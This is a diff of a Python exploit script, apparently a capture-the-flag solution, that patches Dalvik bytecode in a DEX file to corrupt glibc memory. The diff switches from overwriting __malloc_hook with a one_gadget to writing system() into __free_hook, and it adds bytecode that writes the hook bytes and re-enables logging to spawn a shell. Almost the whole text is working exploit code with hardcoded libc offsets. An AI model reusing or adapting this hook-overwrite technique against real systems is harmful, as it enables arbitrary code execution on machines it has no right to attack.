@@ -107,8 +107,8 @@ print(dex.methods[1].code_offset)
 img_base = 0x08048000
 stderr_got = 0x0806AFE0
 stderr_glibc = 0x001B3D00 #xxxxxxF8
-one_gadget = 0x3aa19
-malloc_hook = 0x1b3768
+system_glibc= 0x3ab40
+free_hook = 0x1B48B0
 
 
 # Start Patching
@@ -129,7 +129,7 @@ rawdata = patch(rawdata, pc, add(0, 0, 17))     # v0 now stores the new offset o
 pc += 4
 
 # Before we patch the StringIds, we need to do a few setups to fake all the offsets/strings we need later
-# We need to patch 4 bytes of __malloc_hook to one_gadget, and more for Array to index, so we can do online
+# We need to patch 4 bytes of some function pointer and do rop, and more for Array to index, so we can do online
 # patching
 for i in range(12):
     rawdata = patch(rawdata, pc, newint(3, 0xb4d + i*4))
@@ -318,7 +318,7 @@ pc += 4
 rawdata = patch(rawdata, pc, sub(8, 8, 20))
 pc += 4
 
-rawdata = patch(rawdata, pc, newint(4, 0)) # compute __malloc_hook addr
+rawdata = patch(rawdata, pc, newint(4, 0)) # compute hook addr
 pc += 6
 rawdata = patch(rawdata, pc, mul(4, 8, 19))
 pc += 4
@@ -334,14 +334,14 @@ rawdata = patch(rawdata, pc, newint(22, stderr_glibc))
 pc += 6
 rawdata = patch(rawdata, pc, sub(4, 4, 22))         # libc base
 pc += 4
-rawdata = patch(rawdata, pc, newint(23, one_gadget))
+rawdata = patch(rawdata, pc, newint(23, system_glibc))
 pc += 6
-rawdata = patch(rawdata, pc, newint(24, malloc_hook))
+rawdata = patch(rawdata, pc, newint(24, free_hook-8))
 pc += 6
 rawdata = patch(rawdata, pc, newint(25, 1))         # v25 = 1
 pc += 6
 
-rawdata = patch(rawdata, pc, add(8, 4, 24))         # malloc_hook byte 1
+rawdata = patch(rawdata, pc, add(8, 4, 24))         # hook addr byte 1
 pc += 4
 rawdata = patch(rawdata, pc, sub(5, 8, 3))
 pc += 4
@@ -353,7 +353,7 @@ pc += 4
 rawdata = patch(rawdata, pc, iput(15, 1, 2))   # "40"
 pc += 4
 
-rawdata = patch(rawdata, pc, add(8, 8, 25))         # malloc_hook byte 2
+rawdata = patch(rawdata, pc, add(8, 8, 25))         # hook addr byte 2
 pc += 4
 rawdata = patch(rawdata, pc, sub(5, 8, 3))
 pc += 4
@@ -365,7 +365,7 @@ pc += 4
 rawdata = patch(rawdata, pc, iput(15, 1, 5))   # "43"
 pc += 4
 
-rawdata = patch(rawdata, pc, add(8, 8, 25))         # malloc_hook byte 3
+rawdata = patch(rawdata, pc, add(8, 8, 25))         # hook addr byte 3
 pc += 4
 rawdata = patch(rawdata, pc, sub(5, 8, 3))
 pc += 4
@@ -377,7 +377,7 @@ pc += 4
 rawdata = patch(rawdata, pc, iput(15, 1, 8))   # "46"
 pc += 4
 
-rawdata = patch(rawdata, pc, add(8, 8, 25))         # malloc_hook byte 4
+rawdata = patch(rawdata, pc, add(8, 8, 25))         # hook addr byte 4
 pc += 4
 rawdata = patch(rawdata, pc, sub(5, 8, 3))
 pc += 4
@@ -389,8 +389,31 @@ pc += 4
 rawdata = patch(rawdata, pc, iput(15, 1, 11))   # "49"
 pc += 4
 
-rawdata = patch(rawdata, pc, add(4, 4, 23))         # one gadget
+rawdata = patch(rawdata, pc, add(4, 4, 23))         # glibc system()
 pc += 4
+rawdata = patch(rawdata, pc, "\x41\x00")    # we are patching free_hook, disable logging to avoid calling free()
+pc += 2
+
+rawdata = patch(rawdata, pc, iput(4, 2, 12))
+pc += 4
+rawdata = patch(rawdata, pc, div(4, 4, 17))
+pc += 4
+rawdata = patch(rawdata, pc, iput(4, 2, 13))
+pc += 4
+rawdata = patch(rawdata, pc, div(4, 4, 17))
+pc += 4
+rawdata = patch(rawdata, pc, iput(4, 2, 14))
+pc += 4
+rawdata = patch(rawdata, pc, div(4, 4, 17))
+pc += 4
+rawdata = patch(rawdata, pc, iput(4, 2, 15))
+pc += 4
+rawdata = patch(rawdata, pc, div(4, 4, 17))
+pc += 4
+rawdata = patch(rawdata, pc, "\x41\x01")    # finished patching free_hook, enable logging for shell
+pc += 2
+rawdata = patch(rawdata, pc, "\x7a\xff")
+pc += 2
 
 
 # Patch Checksum
